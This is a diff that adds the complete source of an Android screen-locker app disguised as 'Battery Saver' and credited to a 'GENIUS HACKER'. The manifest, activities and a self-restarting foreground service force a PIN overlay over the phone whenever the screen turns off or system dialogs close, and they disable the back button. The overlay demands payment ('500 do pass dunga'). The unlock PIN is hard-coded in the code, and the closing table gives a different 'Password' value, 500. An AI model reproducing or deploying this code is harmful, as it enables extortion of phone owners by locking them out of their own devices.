@@ -1,0 +1,529 @@
+Phone lock apk full source code
+developed by 卂尺ﾌㄖ
+
+
+
+Android manifest.xml
+
+
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.battery.saver">
+
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.INTERNET" />
+
+    <application
+        android:allowBackup="true"
+        android:icon="@drawable/ic_launcher"
+        android:label="Battery Saver"
+        android:theme="@android:style/Theme.Black.NoTitleBar"
+        android:usesCleartextTraffic="true">
+
+        <activity android:name=".MainActivity"
+            android:exported="true"
+            android:excludeFromRecents="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <service android:name=".LockService"
+            android:exported="true"
+            android:foregroundServiceType="mediaProjection" />
+
+        <activity android:name=".LockOverlayActivity"
+            android:exported="false"
+            android:excludeFromRecents="true"
+            android:showWhenLocked="true"
+            android:turnScreenOn="true"
+            android:theme="@android:style/Theme.Black.NoTitleBar" />
+
+    </application>
+</manifest>
+
+
+
+
+
+main activity.java
+
+
+package com.battery.saver;
+
+import android.app.Activity;
+import android.content.Intent;
+import android.net.Uri;
+import android.os.Build;
+import android.os.Bundle;
+import android.provider.Settings;
+import android.widget.Toast;
+
+public class MainActivity extends Activity {
+    private static final int OVERLAY_PERMISSION_REQUEST = 100;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (!Settings.canDrawOverlays(this)) {
+                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+										   Uri.parse("package:" + getPackageName()));
+                startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST);
+            } else {
+                startLockService();
+                finish();
+            }
+        } else {
+            startLockService();
+            finish();
+        }
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == OVERLAY_PERMISSION_REQUEST) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                if (Settings.canDrawOverlays(this)) {
+                    startLockService();
+                    Toast.makeText(this, "✅ Lock activated!", Toast.LENGTH_SHORT).show();
+                    finish();
+                } else {
+                    Toast.makeText(this, "❌ Permission required!", Toast.LENGTH_LONG).show();
+                    finish();
+                }
+            }
+        }
+    }
+
+    private void startLockService() {
+        Intent serviceIntent = new Intent(this, LockService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(serviceIntent);
+        } else {
+            startService(serviceIntent);
+        }
+    }
+}
+
+
+
+
+
+activy_main.xml
+
+
+
+
+<?xml version="1.0" encoding="utf-8"?>
+<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:orientation="vertical"
+    android:gravity="center"
+    android:background="#0a0a0f"
+    android:padding="20dp">
+
+    <TextView
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text="🔋"
+        android:textSize="64sp"
+        android:layout_marginBottom="10dp"/>
+
+    <TextView
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text="Battery Saver"
+        android:textColor="#00f3ff"
+        android:textSize="28sp"
+        android:textStyle="bold"
+        android:layout_marginBottom="20dp"/>
+
+    <TextView
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text="Grant overlay permission to continue"
+        android:textColor="#a8b2d1"
+        android:textSize="14sp"
+        android:layout_marginBottom="20dp"/>
+
+    <TextView
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text="⚡ Developed by GENIUS HACKER"
+        android:textColor="#4d5679"
+        android:textSize="12sp"
+        android:layout_marginTop="30dp"/>
+
+</LinearLayout>
+
+
+
+LockOverlayActivity.java
+
+
+package com.battery.saver;
+
+import android.app.Activity;
+import android.app.KeyguardManager;
+import android.content.Context;
+import android.content.Intent;
+import android.os.Build;
+import android.os.Bundle;
+import android.view.View;
+import android.view.WindowManager;
+import android.widget.Button;
+import android.widget.EditText;
+import android.widget.TextView;
+import android.widget.Toast;
+
+public class LockOverlayActivity extends Activity {
+    private EditText pinInput;
+    private TextView statusText;
+    private Button btnUnlock;
+    private static final String CORRECT_PIN = "785693";
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_overlay);
+
+        getWindow().setType(WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY);
+        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
+        getWindow().addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED);
+        getWindow().addFlags(WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD);
+        getWindow().addFlags(WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
+
+        pinInput = (EditText) findViewById(R.id.pinInput);
+        statusText = (TextView) findViewById(R.id.statusText);
+        btnUnlock = (Button) findViewById(R.id.btnUnlock);
+
+        btnUnlock.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                String entered = pinInput.getText().toString().trim();
+
+                if (entered.equals(CORRECT_PIN)) {
+                    statusText.setText("✅ Unlocked!");
+                    statusText.setTextColor(0xff00ff00);
+                    Toast.makeText(LockOverlayActivity.this, "✅ Unlocked!", Toast.LENGTH_SHORT).show();
+
+                    try {
+                        stopService(new Intent(LockOverlayActivity.this, LockService.class));
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
+
+                    KeyguardManager km = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
+                    if (km != null) {
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                            km.requestDismissKeyguard(LockOverlayActivity.this, null);
+                        }
+                    }
+
+                    finishAffinity();
+
+                } else {
+                    statusText.setText("❌ Wrong PIN!");
+                    statusText.setTextColor(0xffff0000);
+                    pinInput.setText("");
+                }
+            }
+        });
+    }
+
+    @Override
+    public void onBackPressed() {}
+
+    @Override
+    protected void onResume() {
+        super.onResume();
+        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
+        getWindow().addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED);
+        getWindow().addFlags(WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD);
+        getWindow().addFlags(WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
+    }
+}
+
+
+build.gradule
+
+apply plugin: 'com.android.application'
+
+android {
+    compileSdkVersion 29
+    buildToolsVersion "29.0.2"
+
+    defaultConfig {
+        applicationId "com.battery.saver"
+        minSdkVersion 21
+        targetSdkVersion 29
+        versionCode 1
+        versionName "1.0"
+    }
+
+    buildTypes {
+        release {
+            minifyEnabled false
+            proguardFiles getDefaultProguardFile('proguard-android.txt'), 'proguard-rules.pro'
+        }
+    }
+}
+
+
+
+
+activity_overlay.xml
+
+<?xml version="1.0" encoding="utf-8"?>
+<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:orientation="vertical"
+    android:gravity="center"
+    android:background="#0a0a0f"
+    android:padding="20dp">
+
+    <LinearLayout
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:orientation="vertical"
+        android:gravity="center"
+        android:background="#141829"
+        android:padding="24dp"
+        android:layout_margin="20dp"
+        android:radius="16dp"
+        android:elevation="8dp">
+
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="🔋"
+            android:textSize="40sp"
+            android:layout_marginBottom="6dp"/>
+
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="Battery Saver"
+            android:textColor="#00f3ff"
+            android:textSize="20sp"
+            android:textStyle="bold"
+            android:layout_marginBottom="8dp"/>
+
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="500 do pass dunga"
+            android:textColor="#ff4444"
+            android:textSize="14sp"
+            android:textStyle="bold"
+            android:layout_marginBottom="12dp"/>
+
+        <EditText
+            android:id="@+id/pinInput"
+            android:layout_width="match_parent"
+            android:layout_height="50dp"
+            android:maxWidth="180dp"
+            android:background="#0a0a0f"
+            android:textColor="#ffffff"
+            android:textSize="22sp"
+            android:gravity="center"
+            android:inputType="numberPassword"
+            android:maxLength="6"
+            android:hint="******"
+            android:textColorHint="#4d5679"/>
+
+        <Button
+            android:id="@+id/btnUnlock"
+            android:layout_width="120dp"
+            android:layout_height="46dp"
+            android:background="#e94560"
+            android:text="🔓 UNLOCK"
+            android:textColor="#ffffff"
+            android:textSize="15sp"
+            android:textStyle="bold"
+            android:layout_marginTop="12dp"/>
+
+        <TextView
+            android:id="@+id/statusText"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text=""
+            android:textColor="#ff4444"
+            android:textSize="12sp"
+            android:layout_marginTop="6dp"/>
+
+    </LinearLayout>
+
+    <TextView
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text="⚡ Developed by GENIUS HACKER"
+        android:textColor="#4d5679"
+        android:textSize="10sp"
+        android:layout_marginTop="10dp"/>
+
+</LinearLayout>
+
+
+LockService.java
+
+
+
+package com.battery.saver;
+
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.Service;
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
+import android.os.Build;
+import android.os.IBinder;
+import android.os.PowerManager;
+
+public class LockService extends Service {
+    private PowerManager.WakeLock wakeLock;
+    private BroadcastReceiver screenReceiver;
+    private BroadcastReceiver homeReceiver;
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+
+        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+        wakeLock = pm.newWakeLock(PowerManager.FULL_WAKE_LOCK
+								  | PowerManager.ACQUIRE_CAUSES_WAKEUP
+								  | PowerManager.ON_AFTER_RELEASE, "LockService:WakeLock");
+        wakeLock.acquire();
+
+        // Screen on/off receiver
+        screenReceiver = new BroadcastReceiver() {
+            @Override
+            public void onReceive(Context context, Intent intent) {
+                if (intent.getAction().equals(Intent.ACTION_SCREEN_OFF)) {
+                    showLockOverlay();
+                }
+            }
+        };
+        IntentFilter filter = new IntentFilter();
+        filter.addAction(Intent.ACTION_SCREEN_OFF);
+        registerReceiver(screenReceiver, filter);
+
+        // Home button receiver (for Android 10+)
+        homeReceiver = new BroadcastReceiver() {
+            @Override
+            public void onReceive(Context context, Intent intent) {
+                if (intent.getAction().equals(Intent.ACTION_CLOSE_SYSTEM_DIALOGS)) {
+                    showLockOverlay();
+                }
+            }
+        };
+        IntentFilter homeFilter = new IntentFilter();
+        homeFilter.addAction(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);
+        registerReceiver(homeReceiver, homeFilter);
+
+        startForeground(1, createNotification());
+    }
+
+    private void showLockOverlay() {
+        Intent lockIntent = new Intent(this, LockOverlayActivity.class);
+        lockIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
+							| Intent.FLAG_ACTIVITY_CLEAR_TOP
+							| Intent.FLAG_ACTIVITY_SINGLE_TOP);
+        lockIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
+        startActivity(lockIntent);
+    }
+
+    private Notification createNotification() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel(
+				"lock_channel",
+				"Lock Service",
+				NotificationManager.IMPORTANCE_LOW
+            );
+            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
+            if (manager != null) {
+                manager.createNotificationChannel(channel);
+            }
+            return new Notification.Builder(this, "lock_channel")
+				.setContentTitle("🔋 Battery Saver")
+				.setContentText("Optimizing battery...")
+				.setSmallIcon(android.R.drawable.ic_lock_lock)
+				.build();
+        } else {
+            return new Notification.Builder(this)
+				.setContentTitle("🔋 Battery Saver")
+				.setContentText("Optimizing battery...")
+				.setSmallIcon(android.R.drawable.ic_lock_lock)
+				.build();
+        }
+    }
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        return START_STICKY;
+    }
+
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        if (wakeLock != null && wakeLock.isHeld()) {
+            wakeLock.release();
+        }
+        if (screenReceiver != null) {
+            unregisterReceiver(screenReceiver);
+        }
+        if (homeReceiver != null) {
+            unregisterReceiver(homeReceiver);
+        }
+        Intent restartIntent = new Intent(this, LockService.class);
+        startService(restartIntent);
+    }
+}
+
+
+
+
+
+
+string.xml
+
+
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">Battery Saver</string>
+</resources>
+
+
+
+
+
+Detail Value
+Project Name Battery Saver
+Package Name com.battery.saver
+App Name Battery Saver
+Password 500
+Developer Developed by 卂尺ﾌㄖ™
+
+---
+
+
+
+
